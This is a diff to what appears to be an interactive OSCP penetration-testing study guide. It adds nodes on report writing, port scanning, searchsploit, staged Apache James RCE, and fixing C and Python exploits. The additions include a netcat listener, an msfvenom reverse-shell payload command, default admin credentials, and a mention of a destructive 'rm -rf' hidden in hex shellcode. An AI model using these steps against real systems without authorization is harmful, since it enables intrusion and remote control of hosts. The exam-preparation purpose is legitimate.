@@ -26,6 +26,7 @@ cd ~/results/$IP`,
       { label: "Subnet — need to find live hosts first", next: "host_discovery" },
       { label: "Got a shell — need to pivot deeper", next: "pivot_start" },
       { label: "Documentation — ATT&CK structured notes", next: "reporting" },
+      { label: "Documentation — Report writing", next: "report_writing" },
       { label: "I am stuck / spinning / losing time", next: "mindset_stuck" },
       { label: "Pre-exam setup — before the clock starts", next: "mindset_preexam" },
       { label: "Jump to technique — skip the flow", next: "jump_menu" },
@@ -787,6 +788,7 @@ mkdir -p ~/results/$IP/{scans,exploits,loot,screenshots,tunnels}
       { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
       { label: "TA0040 — Impact (flags)", next: "doc_impact" },
       { label: "Final submission checklist", next: "doc_submit" },
+      { label: "Report writing structure", next: "report_writing" },
       { label: "Note-taking setup (Obsidian)", next: "note_setup" },
       { label: "Back to hacking", next: "start" },
     ],
@@ -1348,6 +1350,102 @@ echo "Done."`,
     choices: [
       { label: "Back to tactic index", next: "reporting" },
       { label: "Start a new machine", next: "start" },
+    ],
+  },
+
+  report_writing: {
+    phase: "REPORT",
+    title: "Report Writing Structure",
+    body: "The report is the only deliverable the client sees. Notes are for you — the report is for them. Two audiences: executive (no jargon, business impact) and technical (enough detail to replicate and fix every finding). Structure matters more than prose quality. A clear finding table with PoC and remediation beats elegant writing every time.",
+    cmd: `# ── Report structure ──────────────────────────────────
+# 1. Executive Summary
+# 2. Testing Environment Considerations
+# 3. Technical Summary (grouped findings)
+# 4. Technical Findings and Recommendations
+# 5. Appendices
+
+# ── 1. Executive Summary template ─────────────────────
+## Engagement Overview
+- Scope: [URLs / IP ranges tested]
+- Timeframe: [dates + hours]
+- Methodology: [OSCP / PTES / OWASP]
+- Testing type: [black box / grey box / credentialed]
+- Source IP: [your attack machine IP]
+- Accounts provided: [none / list them]
+- Constraints: [no DoS / no social engineering / etc]
+
+## What went well (always include something)
+"The application enforced account lockout after 5 failed attempts,
+preventing brute force attacks. Strong password policy was observed."
+
+## Key findings narrative (trends, not exhaustive list)
+"OffSec identified a pattern of unsanitized user input across
+multiple endpoints, resulting in SQL injection and XSS. This
+suggests input validation is not enforced at the framework level."
+
+## Wrap-up
+"Full technical details and remediation steps are provided below."
+
+# ── 2. Testing Environment Considerations ─────────────
+# Document anything that affected the test:
+# - Credentials not provided until day 2
+# - Scope expanded mid-engagement
+# - Time insufficient for full coverage
+# - Any system instability caused by testing
+# If nothing unusual: "No limitations affected this engagement."
+
+# ── 3. Technical Summary (grouped by category) ────────
+# Group findings — don't list by timeline
+# Categories: Auth, Patch Management, Input Validation,
+# Access Control, Encryption, Misconfigurations, AD
+# One paragraph per category with severity and trend.
+
+# ── 4. Technical Findings table ───────────────────────
+# Per finding:
+# | Ref | Severity | Title | Description | Recommendation |
+
+## Finding template:
+### [REF-01] — [High/Med/Low] — [Vuln Name]
+
+**Affected endpoint:** [URL / service / host]
+**Vulnerability:** [What it is and why it's dangerous]
+**Evidence:** [Screenshot ref / appendix ref]
+
+**Reproduction steps:**
+1. Navigate to [URL]
+2. Submit payload: [exact payload]
+3. Observe: [what happens]
+
+**Impact:** [What an attacker achieves — RCE / data theft / privesc]
+
+**Recommendation:** [Specific, actionable fix — not "patch everything"]
+Example: "Parameterize SQL queries using prepared statements in the
+login handler at /src/auth/login.php line 42."
+
+# ── Screenshot rules ──────────────────────────────────
+# Good screenshot:
+# - One concept only
+# - URL visible in browser
+# - Legible without zooming
+# - Caption: 8-10 words max
+# - Client branding visible where possible
+
+# Bad screenshot:
+# - Two findings in one frame
+# - Terminal too small to read
+# - No URL / hostname context
+# - Caption that re-explains the image
+
+# ── OSCP minimum evidence per machine ─────────────────
+# [ ] nmap output showing open ports + versions
+# [ ] exploit execution (command + connection callback)
+# [ ] whoami + hostname + ip + local.txt (single frame)
+# [ ] privesc vector identified (command shown)
+# [ ] whoami (root/SYSTEM) + hostname + ip + proof.txt`,
+    warn: "Never say 'it is impossible to X' — you had limited time and budget. Say 'OffSec was unable to X during the engagement.' Don't oversell or undersell severity — the client's mental model of their risk should be accurate when they finish reading. Remediation must be specific — 'apply patches' fails. 'Update Apache to 2.4.54 on host 192.168.1.10' passes.",
+    choices: [
+      { label: "Back to tactic index", next: "reporting" },
+      { label: "Final submission checklist", next: "doc_submit" },
     ],
   },
 
@@ -2358,7 +2456,14 @@ POST /api/profile
     phase: "RECON",
     title: "Full TCP Scan",
     body: "Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
-    cmd: `# Full TCP (background it)
+    cmd: `# ── Rustscan (faster — labs) ──────────────────────────
+ulimit -n 5000
+rustscan -a $IP --ulimit 5000 -- -sV -sC -oN scans/targeted.txt
+# Scans all ports in seconds, hands open ports to nmap automatically
+# The -- passes remaining args directly to nmap
+
+# ── Nmap (exam-safe, always works) ────────────────────
+# Full TCP (background it)
 nmap -p- --min-rate 5000 -T4 $IP -oN scans/allports.txt
 
 # UDP top 20 (background)
@@ -2367,7 +2472,7 @@ sudo nmap -sU --top-ports 20 $IP -oN scans/udp.txt &
 # HTTP methods check while you wait
 nmap -p80,443 --script=http-methods $IP \\
   --script-args http-methods.url-path='/'`,
-    warn: null,
+    warn: "Rustscan is faster but verify it's on the allowed tools list before exam day — OffSec's policy updates. When in doubt on exam day, use nmap. In labs, rustscan + ulimit 5000 is the move.",
     choices: [
       { label: "Scan complete — run targeted scan on open ports", next: "targeted_scan" },
     ],
@@ -3388,11 +3493,17 @@ curl -sv http://$IP | grep -i "content-security-policy"`,
   searchsploit_web: {
     phase: "WEB",
     title: "Searchsploit / CVE Hunt",
-    body: "Check every service version you found. ExploitDB, GitHub, Google. Read the exploit before running it — most need minor modification.",
+    body: "Check every service version you found. ExploitDB, GitHub, Google. Read the exploit before running it — most need minor modification. ExploitDB and PacketStorm review code before hosting. GitHub does not — treat every GitHub exploit as untrusted until you've read it.",
     cmd: `searchsploit <service> <version>
-searchsploit -m <id>   # copy to CWD
-searchsploit -x <id>   # read before using
-searchsploit --www <service>  # open in browser
+searchsploit -m <id>         # copy to CWD — never modify originals in place
+searchsploit -x <id>         # read in terminal before using
+searchsploit --www <service> # open on exploit-db.com
+searchsploit -s apache 2.4.49  # strict version match — no fuzzy range
+
+# Best workflow: nmap XML output piped straight into searchsploit
+nmap -p <PORTS> -sV -oX targeted.xml $IP
+searchsploit --nmap targeted.xml
+# reads every detected service/version and searches all at once
 
 # Also check:
 # https://github.com/search?q=CVE-XXXX-YYYY
@@ -3400,13 +3511,147 @@ searchsploit --www <service>  # open in browser
 # Google: "<service> <version> exploit site:github.com"
 
 # Most Python exploits just need:
-python3 exploit.py $IP $LHOST $LPORT`,
-    warn: "Read every exploit before running it. Modify LHOST/LPORT, fix paths, test it.",
+python3 exploit.py $IP $LHOST $LPORT
+
+# Decode suspicious hex arrays before trusting them:
+python3 -c "print(b'\\x72\\x6d\\x20\\x2d\\x72\\x66...')"`,
+    warn: "Read every exploit before running it. Modify LHOST/LPORT, fix paths, test it. Check for hardcoded ports — exploits assume default ports (James admin 4555, SMTP 25, etc). GitHub exploits are unreviewed — a real published exploit hid 'rm -rf ~ /*' inside a hex shellcode array. Decode any hex payload you don't recognize. Can't read the code? Test in a snapshot VM, never on your Kali host.",
     choices: [
       { label: "Found working exploit — got shell", next: "shell_upgrade" },
+      { label: "Exploit staged — waiting for trigger", next: "trigger_dependent_rce" },
+      { label: "Exploit needs fixing — C / compiled", next: "exploit_fix_c" },
+      { label: "Exploit needs fixing — Python / web", next: "exploit_fix_web" },
       { label: "Service looks like custom app — try BOF", next: "bof" },
       { label: "Can deliver files to user — client-side", next: "client_side" },
       { label: "No exploit — back to brute force / creds", next: "bruteforce" },
+    ],
+  },
+
+  trigger_dependent_rce: {
+    phase: "WEB",
+    title: "Trigger-Dependent RCE",
+    body: "Some exploits don't give you a shell immediately — they stage a payload that fires when a user action occurs. Common patterns: file written to a home directory that executes on SSH login (.bashrc, .bash_profile), cron job that picks up a dropped file, service restart, or a user opening mail. The exploit reports success but nothing happens until the trigger fires. This is expected behavior — not a failure.",
+    cmd: `# Stage your listener BEFORE running the exploit
+nc -lvnp $LPORT
+
+# Apache James 2.3.2 example — payload fires on SSH login
+# After exploit runs: trigger it manually
+ssh -p <james_ssh_port> <created_user>@$IP
+# James creates a user via admin port, sends payload via SMTP
+# Payload lands in user home dir and executes on next login
+
+# If you can't SSH as that user, check for other login vectors:
+# - POP3 login (port 110 or custom)
+# - Any web login that triggers a shell
+# - Check if a cron is already running as that user
+
+# Confirm payload was staged — reconnect to admin port and verify user exists:
+nc $IP <admin_port>
+# login: james / james  (or root / root)
+# listusers`,
+    warn: "Don't wait 20 minutes staring at a listener. While it sits open: enumerate other services, check for creds, try SSH on both ports. If you can't force the trigger — note it, move on, come back. On exam day flag this box and check back after pivoting elsewhere.",
+    choices: [
+      { label: "Triggered — shell caught", next: "shell_upgrade" },
+      { label: "Can't trigger — moving to next box", next: "start" },
+    ],
+  },
+
+  exploit_fix_c: {
+    phase: "WEB",
+    title: "Fixing C Exploits",
+    body: "C exploits need to be cross-compiled when targeting Windows from Kali. The most common issues: wrong platform headers (winsock2.h), missing linker flags, hardcoded IP/port, bad return address, and off-by-one null byte alignment. Fix each in order — compile after every change.",
+    cmd: `# ── Install cross-compiler ────────────────────────────
+sudo apt install mingw-w64
+
+# ── Compile for 32-bit Windows ────────────────────────
+i686-w64-mingw32-gcc exploit.c -o exploit.exe
+
+# ── Common compile errors + fixes ─────────────────────
+# Error: undefined reference to WSAStartup / socket / connect
+# Fix: add winsock linker flag
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+
+# Error: undefined reference to pthread / ssl
+# Fix: add the relevant lib
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -lpthread
+
+# ── 64-bit Windows ────────────────────────────────────
+x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe -lws2_32
+
+# ── Fix hardcoded IP and port ──────────────────────────
+# grep for the socket setup block:
+grep -n "inet_addr\|sin_port\|htons" exploit.c
+# Change inet_addr("x.x.x.x") → inet_addr("$IP")
+# Change htons(80) → htons(<target_port>)
+
+# ── Replace unknown hex shellcode with your own ────────
+# Generate clean payload (match arch — x86 or x64):
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d" 
+# Paste output into shellcode[] array, keep NOP sled above it
+
+# ── Off-by-one null byte fix ──────────────────────────
+# If EIP is overwritten but misaligned by 1 byte:
+# Look for: memset(padding + initial_buffer_size - 1, 0x00, 1)
+# This null-terminates the string — strcat sees 779 bytes not 780
+# Fix: increase initial_buffer_size by 1
+int initial_buffer_size = 781;  // was 780
+
+# ── Run Windows binary from Kali ──────────────────────
+sudo wine exploit.exe`,
+    warn: "Never modify exploits in /usr/share/exploitdb/ — they get overwritten on update. Always searchsploit -m first. If the return address comes from a DLL not in the target app, find a new one from a non-ASLR module in the vulnerable binary itself.",
+    choices: [
+      { label: "Compiled and working — got shell", next: "shell_upgrade" },
+      { label: "Back to exploit search", next: "searchsploit_web" },
+    ],
+  },
+
+  exploit_fix_web: {
+    phase: "WEB",
+    title: "Fixing Web / Python Exploits",
+    body: "Web exploits are easier to fix than C — no compilation, no arch issues. The work is reading the code and matching it to your target. Five things to check in order: URL/base_url, protocol (HTTP vs HTTPS), credentials, CSRF token param name, SSL verification.",
+    cmd: `# ── Checklist before running any web exploit ──────────
+# 1. base_url / target IP
+grep -n "base_url\|http\|url\|host\|ip" exploit.py | head -20
+
+# 2. HTTP vs HTTPS — if target uses HTTPS, update the url AND
+#    add verify=False to every requests.get/post call:
+#    requests.post(url, data=data, verify=False)
+#    requests.get(url, verify=False)
+
+# 3. Credentials — find and replace:
+grep -n "username\|password\|user\|pass\|admin" exploit.py
+
+# 4. CSRF token param name mismatch — common silent failure:
+#    Add a print statement before the split to see what the server returns:
+#    print("[+] Location header: " + response.headers['Location'])
+#    If the param name doesn't match csrf_param → update it:
+#    csrf_param = "_sk_"   # change to whatever the server sends
+
+# 5. URL path — check if app is installed at /cms, /admin, /app, etc:
+grep -n "path\|route\|upload\|login" exploit.py | head -20
+
+# ── Python 2 → Python 3 common fixes ──────────────────
+# print "x"        → print("x")
+# urllib.quote()   → urllib.parse.quote()
+# raw_input()      → input()
+# basestring       → str
+# .has_key()       → in dict
+
+# ── Debug a crash mid-exploit ─────────────────────────
+# Run with python3 -u for unbuffered output
+python3 -u exploit.py
+# Add print statements above the failing line to inspect variables
+# Read the full traceback — the line number and function name are exact
+
+# ── SSL self-signed cert warning ──────────────────────
+# Suppress urllib3 InsecureRequestWarning:
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`,
+    warn: "If the exploit authenticates and then fails — the most common cause is a CSRF/token parameter name mismatch. Print the redirect Location header to see what the server actually sends. Don't assume the exploit author's variable names match your target's response.",
+    choices: [
+      { label: "Fixed and working — got shell", next: "shell_upgrade" },
+      { label: "Got webshell — need reverse shell", next: "reverse_shell" },
+      { label: "Back to exploit search", next: "searchsploit_web" },
     ],
   },
 
